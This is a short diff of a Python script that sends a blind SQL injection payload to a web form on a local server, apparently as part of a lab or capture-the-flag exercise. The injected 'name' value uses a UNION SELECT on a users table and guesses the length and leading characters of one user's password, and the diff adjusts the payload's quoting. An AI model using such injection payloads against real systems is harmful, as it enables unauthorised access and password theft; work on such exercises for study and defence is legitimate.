@@ -25,7 +25,7 @@ url = "http://127.0.0.1:80/messages"
 # This should be done using a for loop
 print(''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6)))
 response = requests.post(url, data={'name': "inspector_derrick' union select name,password from users where name like 'inspector_derrick' \
-                and length(password)=17 and substring(password, 1, 2)='0c' and '1'='1"})
+                and length(password)=17 and substring(password, 1, 2)='0c"})
 
 soup = BeautifulSoup(response.text, 'html.parser')
 
